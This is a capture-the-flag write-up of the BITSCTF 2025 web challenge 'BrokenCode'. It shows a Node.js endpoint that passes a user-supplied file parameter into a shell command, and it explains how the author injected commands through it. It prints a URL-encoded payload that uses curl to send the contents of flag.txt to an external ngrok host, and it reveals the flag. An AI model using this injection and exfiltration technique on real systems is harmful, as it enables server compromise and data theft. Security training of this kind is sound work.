
# 🌐 BrokenCode


![Challenge Presentation](/images/BITSCTF-2025/BrokenCode/challenge_presentation.png "Challenge Presentation")

## 📊 Challenge Overview
>
>| Category | Details | Additional Info |
>|----------|---------|-----------------|
>| 🏆 Event | BITSCTF - 2025 | [Event Link](https://ctf.bitskrieg.in/challenges#BrokenCode-55) |
>| 🔰 Category | Web | 🌐 |
>| 💎 Points | 500 | Out of 500 total |
>| ⭐ Difficulty | 🟢 Easy | Personal Rating: 1/10 |
>| 👤 Author | Omega | [Profile]() |
>| 🎮 Solves (At the time of flag submission)| 3 | solve rate |
>| 📅 Date | 09-02-2025 | BITSCTF - 2025 |
>| 🦾 Solved By | mH4ck3r0n3 | Team: QnQSec |

## 📝 Challenge Information
> UserX wanted to create a website to run node code . UserX configured the server and made the code to make it work . He is rivilary company developer . We figured out to set some information of his server file . Myabe it will help you get the information?  
> Link : http://20.193.159.130:7000/

## 🎯 Challenge Files & Infrastructure

### Provided Files
>Files: 
>- [:(far fa-file-archive fa-fw): Attached Files](/resources/BITSCTF-2025/BrokenCode/server.js)

# 🔍 Initial Analysis

## First Steps
> Initially, the website appears as follows:
> 
> ![Site Presentation](/images/BITSCTF-2025/BrokenCode/site_presentation.png "Site Presentation")
>
> With an upload screen. By reading the attached files, I found an endpoint `/execute` vulnerable to a `Command Injection`:
> 
> ```javascript
> app.get('/execute', (req, res) => {
>    const file = req.query.file;
>    if (!file) {
>      return res.status(400).send('Missing file parameter');
>    }
>    const execPath = path.join(UPLOAD_DIR, file);
>    exec(`su - rruser -c "node ${execPath}"`, (error, stdout, stderr) => {
>      if (error) {
>        try {
>                execSync(`rm ${execPath}`);  
>            } catch (rmError) {
>                console.error(`Failed to delete ${execPath}:`, rmError);
>            }
>        console.log(error)
>        return res.status(500).send(`Error`);
>      }
> ```
> 
> And also an `/upload` endpoint where it was possible to upload a file, as we can see in the `Site Presentation` image. Initially, I thought I had to upload a malicious file and execute it through the `/execute` endpoint, since it takes a `file=` parameter where you can specify the path of a file to execute with `node`. However, anything that is `controllable` by the user can present a vulnerability. Let's move on to the exploitation.


## 🔬 Vulnerability Analysis
### Potential Vulnerabilities
>- [x] RCE (Remote Command Execution)

# 🎯 Solution Path

## Exploitation Steps
### Initial setup
> As we saw from the `Initial Analysis`, the command is executed:
>
> ```bash
>  su - rruser -c "node ${execPath}"`
> ``` 
> 
> With the user `rruser`, which I later discovered to be `root` through the execution of the `id` command. By entering a path in the `flag` parameter and specifying `; command we want to execute`, `bash` will execute the command `su - rruser -c "node ; injected command"`. In fact, the `;` in bash is a command separator, allowing us to execute multiple commands inline by specifying them as `command1; command2...`. By doing this, I was able to achieve `RCE`. 
>
### Exploitation
>The exploitation was based on executing the command, but of course, the output was displayed on the server and I couldn't see it (the only thing visible was a screen with "Error" written on it). So, I decided to redirect the output to my `ngrok server`:
>
> ```bash
> ngrok http 8080
> ``` 
> 
> Once I started the server, I did a test with the injection by sending `/execute?file=;curl https://ngrok_link`, and I noticed that the request was indeed reaching me. So, I modified the payload by adding the command I wanted to execute (`cat flag.txt`) and then performed the URL encoding using CyberChef:
> 
> ![CyberChef URLEncode](/images/BITSCTF-2025/BrokenCode/cyberchef.png "CyberChef URLEncode")
> 
> Once I did that, I sent it to the server with the endpoint `/execute?flag=;curl%20https://29ca-2-37-167-108.ngrok-free.app?flag=$(cat%20flag.txt)`:
> 
> ![Command Injection](/images/BITSCTF-2025/BrokenCode/command_injection.png "Command Injection") 
> 
> And through the ngrok web interface, I extracted the flag.
>
### Flag capture
>  
>   ![Manual Flag](/images/BITSCTF-2025/BrokenCode/manual_flag.png "Manual Flag")

# 🛠️ Exploitation Process
## Approach
> The exploit creates a local server that is forwarded by ngrok. Once we execute the payload on the challenge server, it captures the request and extracts the `flag` parameter, then constructs the flag and prints it:
> 
> - [:(far fa-file-archive fa-fw): Exploit](/resources/BITSCTF-2025/BrokenCode/exploit.py)

# 🚩 Flag Capture
>{{< admonition danger "Flag" >}}
{{< typeit tag=h4 >}}
BITSCTF{h3r3_y0u_ar3_l3ts_g000000}
{{< /typeit >}}
>{{< /admonition >}}
>
## Proof of Execution
> ![Automated Flag](/images/BITSCTF-2025/BrokenCode/automated_flag.png "Automated Flag")
>*Screenshot of successful exploitation*

# 🔧 Tools Used
>| Tool | Purpose |
>|------|---------|
>| Python | Exploit |

# 💡 Key Learnings
## Time Optimization
> When an input that we can control is directly inserted into a command to be executed, it will almost always be a **RCE** (Remote Code Execution) vulnerability, and that's where the vulnerability will likely be found.
## Skills Improved
>- [ ] Binary Exploitation
>- [ ] Reverse Engineering
>- [x] Web Exploitation
>- [ ] Cryptography
>- [ ] Forensics
>- [ ] OSINT
>- [ ] Miscellaneous

---
# 📊 Final Statistics
| Metric | Value | Notes |
|--------|--------|-------|
| Time to Solve | 00:05 | From start to flag |
| Global Ranking (At the time of flag submission)| 4/845 | Challenge ranking |
| Points Earned | 500 | Team contribution |

*Created: 09-02-2025 • Last Modified: 09-02-2025*
*Author: mH4ck3r0n3 • Team: QnQSec*
